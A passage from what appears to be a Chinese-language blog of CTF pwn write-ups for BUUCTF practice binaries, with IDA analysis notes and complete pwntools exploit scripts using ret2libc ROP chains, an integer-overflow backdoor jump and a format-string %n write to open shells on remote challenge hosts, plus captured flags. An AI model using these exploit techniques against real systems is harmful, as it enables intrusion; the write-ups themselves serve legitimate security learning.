class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc</span></span><br><span class="line">base_addr = puts_addr - lib.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = base_addr + lib.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = base_addr + <span class="built_in">next</span>(lib.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))<span class="comment">#next为python3所用的</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;M&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>-<span class="number">1</span>) + p64(ret) +p64(rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>换一种写法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25784</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">pop_rdi=<span class="number">0x400c83</span></span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line">code=<span class="number">0x4009a0</span></span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice!\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(code)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n\n&#x27;</span>)</span><br><span class="line">puts_add=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#print(hex(puts_add))</span></span><br><span class="line"></span><br><span class="line">system=puts_add-<span class="number">0x31580</span></span><br><span class="line">binsh=puts_add+<span class="number">0x1334da</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span>+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>抱着学习的态度看看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25784</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_en_2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x400c84</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">0x7</span>)+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x57</span>+p64(ret)+p64(rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><p> 2024.6.27</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031500229.png" alt="image-20240627201618243"></p>
<p>32位，NX保护，</p>
<p>先运行一下看看，看样子是一个要知道管理员密码</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031500771.png" alt="image-20240627203301695"></p>
<p>ida静态分析一下，main函数，可以发现管理员密码为：administrator</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031500152.png" alt="image-20240627204934305"></p>
<p>main函数分析的话，找一下有没有漏洞，</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031500083.png" alt="image-20240627210841957"></p>
<p>这里也很明显，输入的字符的最大长度为100，但是要比较多字符却只有 administrator。这里就是很明显的溢出了。</p>
<p>在看看这个Getflag函数。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031500381.png" alt="image-20240627205037814"></p>
<p>点进去看一下就知道，这个输入的src为我们所要的flag</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607928.png" alt="image-20240627203524212"></p>
<p>大体思路如下：</p>
<blockquote>
<ul>
<li>首先先选1添加一个日志，然后再把我们的密文输进去，最后在选输出所有的日志</li>
<li>这里我们看见了system函数，在找找看有没有&#x2F;bin&#x2F;sh&#x2F;函数，这里应用ROPgadget工具查找</li>
<li>最后构建payload，用rop来进行解题</li>
</ul>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031500054.png" alt="image-20240628090123634"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031500213.png" alt="image-20240628092759005"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607929.png" alt="image-20240628092803994"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25511</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line">bin_addr=<span class="number">0x080482ea</span></span><br><span class="line">system_addr=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;Please input admin password:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">r.recvuntil(<span class="string">&#x27;0.Exit\n:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>)+p32(system_addr)+<span class="string">b&#x27;1234&#x27;</span>+p32(bin_addr)</span><br><span class="line">            </span><br><span class="line">r.recvuntil(<span class="string">&quot;Please input new log info:&quot;</span>)<span class="comment">#先添加日志</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">            </span><br><span class="line">r.recvuntil(<span class="string">&#x27;0.Exit\n:&#x27;</span>) </span><br><span class="line">r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>2024.6.29</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031500599.png" alt="image-20240629134748740">、</p>
<p>看一下为32位架构和NX保护</p>
<p>运行一下这个文件看看</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031500781.png" alt="image-20240629134901586"></p>
<p>ida静态分析一下，猜测是这个read函数发生溢出，buf只有136位，并且函数只读取了0x100（256）位，可能发生溢出。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031500999.png" alt="image-20240629135415017"></p>
<blockquote>
<p><strong>read(0,buf,100)的意思是从文件描述符为0的输入流(通常是标准输入)中读取最多100个字节的数据，并将其存储在名为buf的缓冲区中。如果输入流中的可用字节数少于100个字节，那么read()函数将阻塞，直到有足够的数据可用为止。函数的返回值是实际读取的字节数，如果出现错误则返回-1。</strong></p>
</blockquote>
<p>这里也能看见距离栈底的距离为0x88h，再看一下eip的长度，32位一般为4位</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031501209.png" alt="image-20240629135756521"></p>
<p>这里再找一下溢出的地方,好像找不太到，其实看题目就知道，应该是一个rop</p>
<p>这里先简单写一下exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26021</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>在看看rdi或者bin&#x2F;sh的地址。</p>
<p>发现好像找不到,所以说这个rop怎么构建的呢？</p>
<p>这里是泄露write函数来泄露libc版本</p>
<blockquote>
<p><strong>之前遇到过puts函数，可以回头复习一下</strong></p>
</blockquote>
<h3 id="write函数来泄露程序的libc版本"><a href="#write函数来泄露程序的libc版本" class="headerlink" title="write函数来泄露程序的libc版本"></a>write函数来泄露程序的libc版本</h3><ul>
<li>1.利用write函数来泄露程序的libc版本</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031501776.png" alt="image-20240629145759424"></p>
<blockquote>
<p>这里了解一下write函数，<strong>ssize_t write(int fd,const void*buf,size_t count);</strong></p>
<p>fd:是文件描述符（write所对应的是写，即就是1）<br>buf:通常是一个字符串，需要写入的字符串<br>count：是每次写入的字节数</p>
</blockquote>
<p>所以就可以直接构造payload了</p>
<blockquote>
<p>payload&#x3D;’a’*(0x88+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)</p>
<p>这里p32（0）+p32(write_addr)+p32(4)是在设置write函数的参数，对应函数原型看一下，32位程序是4位，所以这边写的4，对应的64位程序是8位</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br></pre></td></tr></table></figure>

<ul>
<li>2.知道libc版本后去计算程序里的system函数和字符串“&#x2F;bin&#x2F;sh”的地址</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)     <span class="comment">#计算偏移量#偏移量=程序里的函数地址-libc里的函数地址</span></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_addr=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>



<ul>
<li>3.覆盖返回地址为system（‘&#x2F;bin&#x2F;sh’），获取shell</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_addr)</span><br></pre></td></tr></table></figure>

<p>完整exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26402</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">payload=bs<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libic</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)     <span class="comment">#计算偏移量#偏移量=程序里的函数地址-libc里的函数地址</span></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_addr=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607930.png" alt="image-20240629152819623"></p>
<p>也是得到了flag</p>
<p>flag{6635cb79-c64d-4f23-aa1a-9f166ab7e05b}</p>
<h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><p>2024.7.1</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031501360.png" alt="image-20240701152552715"></p>
<p>日常检查。NX保护和64位架构</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031501411.png" alt="image-20240701152717392"></p>
<p>随便运行一下看看，扔进ida里面看看</p>
<p>其实看一眼函数栏就看见了后门函数，挺明显的哈，连system（&#x2F;bin&#x2F;sh）都直接给了，看一下函数的地址</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031501076.png" alt="image-20240701153020410"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031501585.png" alt="image-20240701155619429"></p>
<blockquote>
<p> 返回地址为0x400726</p>
</blockquote>
<p>找一下溢出点</p>
<p>我觉得就是这个read函数</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031501651.png" alt="image-20240701160723575"></p>
<ul>
<li>首先了解一下read函数，这里的read函数意思是将字符’0’读取nbytes个数，到buf缓冲区。</li>
<li>解题思路：nbytes参数的类型 是 size_t，它是一个无符号整型。但是第7行又将它转换成了有符号的整型，存在整数溢出漏洞（即无符号的数转换成有符号的整型后超过了有符号的整型能表示的范围，从而造成溢出，常用-1来造成溢出）</li>
</ul>
<h3 id="整数溢出漏洞"><a href="#整数溢出漏洞" class="headerlink" title="整数溢出漏洞"></a>整数溢出漏洞</h3><p>先老规矩backdoor溢出一下看看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29090</span>)</span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">backdoor=<span class="number">0x400726</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031501266.png" alt="image-20240701161453299"></p>
<p>得到flag为</p>
<p>flag{9289bced-6154-45af-aecf-33cc19f7bf1b}</p>
<blockquote>
<p>这里跟我平常遇见的简单的后门函数还不太一样，这里是利用read函数来进行溢出的，利用读取错误。返回-1来造成溢出。</p>
</blockquote>
<h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><p>2024.7.3</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031501962.png" alt="image-20240703162107800"></p>
<p>日常检查，NX保护，64位架构</p>
<p>运行一下看看</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031505354.png" alt="image-20240703162318970"></p>
<p>看样子应该是泄露libc版本，ida静态分析一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031505847.png" alt="image-20240703162453923"></p>
<p>这个read函数存在漏洞，并且read的最大长度为100，但是buf只有32。存在溢出，长度为（0x20+8）</p>
<p>ok，这里利用puts函数进行泄露libc版本，简单写一下wp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26127</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi_ret = <span class="number">0x400733</span> </span><br><span class="line">ret = <span class="number">0x4004c9</span></span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Pull up your sword and tell me u story!&#x27;</span>)</span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Pull up your sword and tell me u story!&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(ret)+p64(rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031505908.png" alt="image-20240703171638370"></p>
<p>最后得到flag</p>
<p>flag{97e4a79a-ec1b-4dfb-bd0a-481099264157}</p>
<h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><p>2024.7.3</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031505228.png" alt="image-20240703172309090"></p>
<p>简单说一下，32位，NX保护，和stack保护</p>
<p>简单运行一下，扔进ida进去看看</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031505557.png" alt="image-20240703173050242"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031505968.png" alt="image-20240703173944856"></p>
<p>奥！一下就看见了system（&#x2F;bin&#x2F;sh）函数，看一下地址</p>
<blockquote>
<p> 0x80485D</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031505512.png" alt="image-20240703174048431"></p>
<p>​	找一下溢出点，这个printf函数的格式化字符串漏洞，看一下偏移量</p>
<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031505859.png" alt="image-20240703174538814"></p>
<p>偏移量为11</p>
<p>然后看一下条件，这里的if（x&#x3D;&#x3D;4）,看一下x的地址0x804A02C</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607931.png" alt="image-20240703175332565"></p>
<p>所以exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29553</span>)</span><br><span class="line">payload=p32(<span class="number">0x804A02C</span>)+<span class="string">&quot;%11$n&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031505614.png" alt="image-20240703175925505"></p>
<p>flag{dd8a37aa-23f4-418e-a471-65a1d52f5db4}</p>
<p>还是很简单的</p>
<h2 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h2><p>2024.7.3</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031505799.png" alt="image-20240703192657556"></p>
<p>日常检查，64位架构，NX保护</p>
